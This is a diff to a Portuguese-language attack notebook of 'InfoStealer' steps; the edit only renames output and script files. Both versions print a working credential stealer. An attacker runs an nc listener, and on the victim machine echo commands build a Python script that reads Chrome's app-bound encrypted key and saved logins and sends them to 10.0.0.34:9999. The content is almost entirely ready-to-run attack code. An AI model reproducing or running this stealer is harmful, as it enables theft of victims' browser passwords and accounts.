@@ -254,7 +254,7 @@ powershell -command "Add-Type -AssemblyName System.Windows.Forms; $code='using S
 ### 6. InfoStealer - Roubar users do navegador, senha criptografada
 ### No shell do atacante
 ``` cmd
-nc -lvnp 9999 > chrome_passwords.txt
+nc -lvnp 9999 > chrome_users.txt
 ```
 
 ### No shell da vitima
@@ -265,57 +265,56 @@ python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ
 ### 6.1. InfoStealer - Extrair app_bound_key do navegador
 ### No shell do atacante
 ``` cmd
-nc -lvnp 9999 | tee passwords_full.json
+nc -lvnp 9999 | tee app_bound_key.json
 ```
 ### No shell da vitima
 ``` cmd
-echo import os, sqlite3, shutil, tempfile, socket, subprocess, json, base64 > %TEMP%\final_v2.py
-echo. >> %TEMP%\final_v2.py
-echo # Lê a chave App-Bound do Local State >> %TEMP%\final_v2.py
-echo local_state_path = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State' >> %TEMP%\final_v2.py
-echo with open(local_state_path, 'r') as f: >> %TEMP%\final_v2.py
-echo     local_state = json.load(f) >> %TEMP%\final_v2.py
-echo app_bound_key_b64 = local_state['os_crypt']['app_bound_encrypted_key'] >> %TEMP%\final_v2.py
-echo print('Chave App-Bound encontrada') >> %TEMP%\final_v2.py
-echo. >> %TEMP%\final_v2.py
-echo # Extrai senhas >> %TEMP%\final_v2.py
-echo login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data' >> %TEMP%\final_v2.py
-echo temp_db = tempfile.mktemp(suffix='.db') >> %TEMP%\final_v2.py
-echo shutil.copy2(login_data, temp_db) >> %TEMP%\final_v2.py
-echo conn = sqlite3.connect(temp_db) >> %TEMP%\final_v2.py
-echo cursor = conn.cursor() >> %TEMP%\final_v2.py
-echo cursor.execute('SELECT origin_url, username_value, password_value FROM logins') >> %TEMP%\final_v2.py
-echo. >> %TEMP%\final_v2.py
-echo # Salva em formato JSON >> %TEMP%\final_v2.py
-echo output = {'app_bound_key': app_bound_key_b64, 'passwords': []} >> %TEMP%\final_v2.py
-echo for url, user, pwd in cursor.fetchall(): >> %TEMP%\final_v2.py
-echo     output['passwords'].append({ >> %TEMP%\final_v2.py
-echo         'url': url, >> %TEMP%\final_v2.py
-echo         'username': user, >> %TEMP%\final_v2.py
-echo         'password_b64': base64.b64encode(pwd).decode(), >> %TEMP%\final_v2.py
-echo         'password_hex': pwd.hex(), >> %TEMP%\final_v2.py
-echo         'prefix': pwd[:4].hex() >> %TEMP%\final_v2.py
-echo     }) >> %TEMP%\final_v2.py
-echo conn.close() >> %TEMP%\final_v2.py
-echo os.unlink(temp_db) >> %TEMP%\final_v2.py
-echo. >> %TEMP%\final_v2.py
-echo result = json.dumps(output, indent=2) >> %TEMP%\final_v2.py
-echo print(result) >> %TEMP%\final_v2.py
-echo. >> %TEMP%\final_v2.py
-echo # Envia >> %TEMP%\final_v2.py
-echo try: >> %TEMP%\final_v2.py
-echo     s = socket.socket(); s.settimeout(10) >> %TEMP%\final_v2.py
-echo     s.connect(('10.0.0.34', 9999)); s.send(result.encode()); s.close() >> %TEMP%\final_v2.py
-echo     print('ENVIADO!') >> %TEMP%\final_v2.py
-echo except Exception as e: >> %TEMP%\final_v2.py
-echo     print(f'Erro envio: {e}') >> %TEMP%\final_v2.py
+echo import os, sqlite3, shutil, tempfile, socket, subprocess, json, base64 > %TEMP%\app_bound_key.py
+echo. >> %TEMP%\app_bound_key.py
+echo # Lê a chave App-Bound do Local State >> %TEMP%\app_bound_key.py
+echo local_state_path = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State' >> %TEMP%\app_bound_key.py
+echo with open(local_state_path, 'r') as f: >> %TEMP%\app_bound_key.py
+echo     local_state = json.load(f) >> %TEMP%\app_bound_key.py
+echo app_bound_key_b64 = local_state['os_crypt']['app_bound_encrypted_key'] >> %TEMP%\app_bound_key.py
+echo print('Chave App-Bound encontrada') >> %TEMP%\app_bound_key.py
+echo. >> %TEMP%\app_bound_key.py
+echo # Extrai senhas >> %TEMP%\app_bound_key.py
+echo login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data' >> %TEMP%\app_bound_key.py
+echo temp_db = tempfile.mktemp(suffix='.db') >> %TEMP%\app_bound_key.py
+echo shutil.copy2(login_data, temp_db) >> %TEMP%\app_bound_key.py
+echo conn = sqlite3.connect(temp_db) >> %TEMP%\app_bound_key.py
+echo cursor = conn.cursor() >> %TEMP%\app_bound_key.py
+echo cursor.execute('SELECT origin_url, username_value, password_value FROM logins') >> %TEMP%\app_bound_key.py
+echo. >> %TEMP%\app_bound_key.py
+echo # Salva em formato JSON >> %TEMP%\app_bound_key.py
+echo output = {'app_bound_key': app_bound_key_b64, 'passwords': []} >> %TEMP%\app_bound_key.py
+echo for url, user, pwd in cursor.fetchall(): >> %TEMP%\app_bound_key.py
+echo     output['passwords'].append({ >> %TEMP%\app_bound_key.py
+echo         'url': url, >> %TEMP%\app_bound_key.py
+echo         'username': user, >> %TEMP%\app_bound_key.py
+echo         'password_b64': base64.b64encode(pwd).decode(), >> %TEMP%\app_bound_key.py
+echo         'password_hex': pwd.hex(), >> %TEMP%\app_bound_key.py
+echo         'prefix': pwd[:4].hex() >> %TEMP%\app_bound_key.py
+echo     }) >> %TEMP%\app_bound_key.py
+echo conn.close() >> %TEMP%\app_bound_key.py
+echo os.unlink(temp_db) >> %TEMP%\app_bound_key.py
+echo. >> %TEMP%\app_bound_key.py
+echo result = json.dumps(output, indent=2) >> %TEMP%\app_bound_key.py
+echo print(result) >> %TEMP%\app_bound_key.py
+echo. >> %TEMP%\app_bound_key.py
+echo # Envia >> %TEMP%\app_bound_key.py
+echo try: >> %TEMP%\app_bound_key.py
+echo     s = socket.socket(); s.settimeout(10) >> %TEMP%\app_bound_key.py
+echo     s.connect(('10.0.0.34', 9999)); s.send(result.encode()); s.close() >> %TEMP%\app_bound_key.py
+echo     print('ENVIADO!') >> %TEMP%\app_bound_key.py
+echo except Exception as e: >> %TEMP%\app_bound_key.py
+echo     print(f'Erro envio: {e}') >> %TEMP%\app_bound_key.py
 ```
 
 ### Depois rode na vitima
 ``` cmd
-python %TEMP%\final_v2.py
+python %TEMP%\app_bound_key.py
 ```
-
 ### 6.2. InfoStealer - Extrair Master Key do Navegador
 ### No shell do atacante
 ``` cmd
